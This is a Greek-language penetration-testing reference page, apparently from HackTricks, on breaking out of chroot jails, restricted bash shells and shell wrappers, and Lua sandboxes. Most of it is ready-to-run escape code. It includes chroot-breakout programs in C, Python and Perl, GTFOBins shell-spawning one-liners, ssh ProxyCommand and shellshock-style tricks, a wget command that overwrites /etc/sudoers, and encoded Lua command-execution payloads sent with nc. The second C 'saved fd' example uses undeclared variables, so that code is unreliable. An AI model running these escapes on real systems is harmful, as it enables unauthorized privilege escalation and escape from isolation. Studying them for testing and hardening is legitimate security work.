# Απόδραση από Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Αναζητήστε στο** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **αν μπορείτε να εκτελέσετε οποιοδήποτε binary με την ιδιότητα "Shell"**

## Αποδράσεις από Chroot

Από τη [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Ο μηχανισμός chroot **δεν προορίζεται για προστασία** απέναντι σε σκόπιμη παραβίαση από **προνομιούχους** (**root**) **χρήστες**. Στα περισσότερα συστήματα, τα περιβάλλοντα chroot δεν λειτουργούν σωστά όταν τοποθετούνται το ένα μέσα στο άλλο και τα chrooted προγράμματα **με επαρκή δικαιώματα μπορούν να εκτελέσουν ένα δεύτερο chroot για να αποδράσουν**.\
Συνήθως αυτό σημαίνει ότι για να αποδράσετε πρέπει να είστε root μέσα στο chroot.

> [!TIP]
> Το **tool** [**chw00t**](https://github.com/earthquake/chw00t) δημιουργήθηκε για να εκμεταλλεύεται τα παρακάτω σενάρια και να πραγματοποιεί escape από το `chroot`.

### Root + CWD

> [!WARNING]
> Αν είστε **root** μέσα σε ένα chroot, **μπορείτε να αποδράσετε** δημιουργώντας **ένα άλλο chroot**. Αυτό συμβαίνει επειδή 2 chroot δεν μπορούν να συνυπάρχουν (στο Linux), οπότε αν δημιουργήσετε έναν φάκελο και στη συνέχεια **δημιουργήσετε ένα νέο chroot** σε αυτόν τον νέο φάκελο, ενώ **βρίσκεστε εκτός αυτού**, θα βρίσκεστε πλέον **εκτός του νέου chroot** και επομένως θα βρίσκεστε στο FS.
>
> Αυτό συμβαίνει επειδή συνήθως το chroot ΔΕΝ μετακινεί τον τρέχοντα working directory σας στον υποδεικνυόμενο, οπότε μπορείτε να δημιουργήσετε ένα chroot αλλά να βρίσκεστε εκτός αυτού.

Συνήθως δεν θα βρείτε το binary `chroot` μέσα σε ένα chroot jail, αλλά **θα μπορούσατε να κάνετε compile, upload και execute** ένα binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτήν την περίπτωση ο **attacker αποθηκεύει ένα file descriptor για τον τρέχοντα κατάλογο** και στη συνέχεια **δημιουργεί το chroot σε έναν νέο φάκελο**. Τέλος, καθώς έχει **πρόσβαση** σε αυτό το **FD** **εκτός** του chroot, αποκτά πρόσβαση σε αυτό και **διαφεύγει**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> Το FD μπορεί να μεταφερθεί μέσω Unix Domain Sockets, οπότε:
>
> - Δημιουργήστε μια child process (fork)
> - Δημιουργήστε UDS ώστε η parent και η child process να μπορούν να επικοινωνούν
> - Εκτελέστε chroot στη child process, σε διαφορετικό φάκελο
> - Στην parent proc, δημιουργήστε ένα FD για έναν φάκελο που βρίσκεται έξω από το νέο chroot της child proc
> - Μεταφέρετε αυτό το FD στη child proc χρησιμοποιώντας το UDS
> - Η child process εκτελεί chdir σε αυτό το FD και, επειδή βρίσκεται έξω από το chroot της, θα διαφύγει από το jail

### Root + Mount

> [!WARNING]
>
> - Κάντε mount τη root device (/) σε έναν φάκελο μέσα στο chroot
> - Κάντε chroot σε αυτόν τον φάκελο
>
> Αυτό είναι εφικτό στο Linux

### Root + /proc

> [!WARNING]
>
> - Κάντε mount το procfs σε έναν φάκελο μέσα στο chroot (αν δεν έχει ήδη γίνει)
> - Αναζητήστε ένα pid που έχει διαφορετικό root/cwd entry, όπως: /proc/1/root
> - Κάντε chroot σε αυτό το entry

### Root(?) + Fork

> [!WARNING]
>
> - Δημιουργήστε ένα Fork (child proc), κάντε chroot σε έναν διαφορετικό φάκελο βαθύτερα στο FS και κάντε CD σε αυτόν
> - Από την parent process, μετακινήστε τον φάκελο στον οποίο βρίσκεται η child process σε έναν φάκελο που προηγείται του chroot της child process
> - Αυτή η child process θα βρεθεί έξω από το chroot

### ptrace

> [!WARNING]
>
> - Παλαιότερα, οι users μπορούσαν να κάνουν debug τις δικές τους processes από μια process του ίδιου του user... όμως αυτό πλέον δεν είναι δυνατό από προεπιλογή
> - Σε κάθε περίπτωση, αν είναι δυνατό, μπορείτε να κάνετε ptrace σε μια process και να εκτελέσετε shellcode μέσα σε αυτήν ([δείτε αυτό το παράδειγμα](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Αναγνώριση

Λάβετε πληροφορίες σχετικά με το jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Τροποποίηση του PATH

Έλεγξε αν μπορείς να τροποποιήσεις τη μεταβλητή περιβάλλοντος PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρήση του vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers και help viewers

Πολλά περιορισμένα περιβάλλοντα εξακολουθούν να αφήνουν διαθέσιμα **pagers** ή **help viewers**. Συνήθως είναι ταχύτερο να τα εκμεταλλευτείτε παρά να προσπαθήσετε να αναδημιουργήσετε το `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Αν το `git` είναι διαθέσιμο, θυμηθείτε ότι η έξοδος βοήθειάς του συνήθως περνάει από έναν pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

Μόλις μάθετε ποια binaries είναι προσβάσιμα, δοκιμάστε πρώτα τα προφανή shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Αν μπορείτε να κάνετε **inject arguments** μόνο σε μια επιτρεπόμενη εντολή (αντί να την εκτελείτε ελεύθερα), ελέγξτε επίσης το **GTFOArgs**.

### Δημιουργία script

Ελέγξτε αν μπορείτε να δημιουργήσετε ένα εκτελέσιμο αρχείο με περιεχόμενο _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Λήψη bash μέσω SSH

Αν έχετε πρόσβαση μέσω ssh, συχνά μπορείτε να ζητήσετε από τον server να εκτελέσει ένα **διαφορετικό πρόγραμμα** αντί για το περιορισμένο login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Αν το `ssh` είναι ένα από τα λίγα τοπικά επιτρεπόμενα binaries, θυμηθείτε ότι μπορεί επίσης να γίνει κατάχρηση ως **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Δήλωση
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Μπορείτε να κάνετε overwrite, για παράδειγμα, στο αρχείο sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Περιορισμένα shell wrappers (`git-shell`, `rssh`, `lshell`)

Ορισμένα περιβάλλοντα δεν σας μεταφέρουν σε ένα απλό `rbash`, αλλά σε **wrappers** όπως τα `git-shell`, `rssh` ή `lshell`:

- Το `git-shell` δέχεται μόνο server-side Git commands, καθώς και οτιδήποτε υπάρχει μέσα στο `~/git-shell-commands/`. Αν αυτός ο κατάλογος υπάρχει, εκτελέστε `help` για να απαριθμήσετε τις επιτρεπόμενες custom actions. Αν μπορείτε να κάνετε **write** εκεί, οποιοδήποτε executable τοποθετηθεί σε αυτόν τον κατάλογο γίνεται προσβάσιμο.
- Τα `rssh` / `lshell` συνήθως επιτρέπουν μόνο `scp`, `sftp`, `rsync` ή Git-style operations. Σε αυτές τις περιπτώσεις επικεντρωθείτε πρώτα σε **file write primitives**: κάντε upload το `authorized_keys`, ένα shell startup file ή ένα helper script σε writable location και, στη συνέχεια, συνδεθείτε ξανά με `ssh -t ...`.
- Αν το wrapper φιλτράρει μόνο τη command line, απαριθμήστε τα reachable binaries και, στη συνέχεια, κάντε pivot ξανά στα **GTFOBins / GTFOArgs**.

### Άλλα tricks

Ελέγξτε επίσης:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Θα μπορούσε επίσης να παρουσιάζει ενδιαφέρον η σελίδα:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks σχετικά με το escaping από Python jails στην ακόλουθη σελίδα:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Σε αυτήν τη σελίδα μπορείτε να βρείτε τις global functions στις οποίες έχετε πρόσβαση μέσα στη Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval με command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Μερικά tricks για να **καλείτε functions μιας library χωρίς να χρησιμοποιείτε τελείες**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Απαριθμήστε τις συναρτήσεις μιας βιβλιοθήκης:
```bash
for k,v in pairs(string) do print(k,v) end
```
Σημειώστε ότι κάθε φορά που εκτελείτε το προηγούμενο one-liner σε ένα **διαφορετικό lua environment, η σειρά των functions αλλάζει**. Επομένως, αν χρειάζεται να εκτελέσετε μια συγκεκριμένη function, μπορείτε να πραγματοποιήσετε μια brute force επίθεση φορτώνοντας διαφορετικά lua environments και καλώντας την πρώτη function της βιβλιοθήκης:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Λήψη interactive lua shell**: Αν βρίσκεστε μέσα σε ένα limited lua shell, μπορείτε να λάβετε ένα νέο lua shell (και, ιδανικά, unlimited) καλώντας:
```bash
debug.debug()
```
## Αναφορές

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Διαφάνειες: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
